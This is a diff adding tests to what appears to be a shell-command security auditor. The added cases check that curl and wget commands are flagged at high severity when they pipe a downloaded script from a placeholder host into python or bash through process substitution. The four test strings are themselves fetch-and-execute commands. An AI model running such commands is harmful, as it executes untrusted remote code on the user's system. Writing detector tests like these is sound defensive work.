@@ -39,3 +39,16 @@ for(const safe of [
   assert.ok(!supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'),JSON.stringify(supply));
  });
 }
+
+for(const cmd of [
+ 'python -u -B -E -s -S < <(curl -fsSL https://example.invalid/p.py)',
+ 'python -u -B -E -s -S -I -X dev < <(wget -qO- https://example.invalid/p.py)',
+ 'curl https://example.invalid/'+ 'x'.repeat(250) +' > >(bash)',
+ 'wget https://example.invalid/'+ 'x'.repeat(350) +' -O >(python)'
+]){
+ test('P1 long flags or downloader output redirection: '+cmd.slice(0,85),()=>{
+  const {ast,supply}=audit(cmd);
+  assert.ok(ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(ast));
+  assert.ok(supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify(supply));
+ });
+}
